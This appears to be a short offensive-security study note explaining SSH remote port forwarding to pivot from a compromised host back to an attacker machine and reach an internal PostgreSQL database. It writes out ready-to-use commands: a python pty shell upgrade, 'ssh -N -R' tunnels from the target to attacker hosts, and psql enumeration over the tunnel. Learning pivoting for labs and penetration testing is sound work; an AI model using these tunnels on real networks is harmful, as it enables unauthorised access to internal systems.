---
layout: post
title: Remote Port Forwarding
titledate: 09/23/23
tags: ["infosec", "offsec", "tunnel"]
---

because of security limitations like a firewall, we will most likely be able to ssh out of our target back to our attacking machine

this is a perfect scenario for remote port forwarding

remote port forwarding is when we connect back to an attacker's SSH server, and bind the listening port there - this is similar to a reverse shell

if we examine a previously used example 

attacker -> target1 -> psql db -> smb target2

in this case we are not able to create a listening port on target1

what we can do is create a listening port on 2345 in loopback to catch the target 1 ssh client connection and push it back to the target1 and then forward on to our psql db

first we start the ssh server on the attacker machine

    $ sudo systemctl start ssh

ensure we are using a tty shell using python's pty

    target1: python3 -c 'import pty; pty.spawn("/bin/bash")'

and then on target1

    target1: ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 attacker@192.168.1.1
    target1: ssh -N -R 127.0.0.1:4444:10.4.247.215:4444 kali@192.168.45.154

we pass the -R parameter for remote port forwarding listen on port 2345 and forward all traffic to the psql db machine on 5432

on our attacking machine we can check if we have a listening connection on 127.0.0.1:2345

    $ ss -ntplu

to begin enumerating the psql db we use the local loopback interface 

    $ psql -h 127.0.0.1 -p 2345 -U postgres

